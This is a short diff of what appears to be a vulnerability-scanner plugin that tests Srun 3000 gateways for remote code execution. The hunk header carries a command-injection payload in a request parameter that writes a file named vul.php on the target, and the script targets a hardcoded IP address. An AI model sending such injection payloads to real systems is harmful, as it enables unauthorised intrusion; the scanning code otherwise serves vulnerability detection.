@@ -30,5 +30,5 @@ action=dm&sid=;echo+'vulnerable' > vul.php;
         security_hole("Srun_3000 Gate RCE vulnerable!:"+verify)
 
 if __name__ == '__main__':
-    from dummy import *
+
     audit(assign('srun_gateway', 'http://223.72.180.45/')[1])
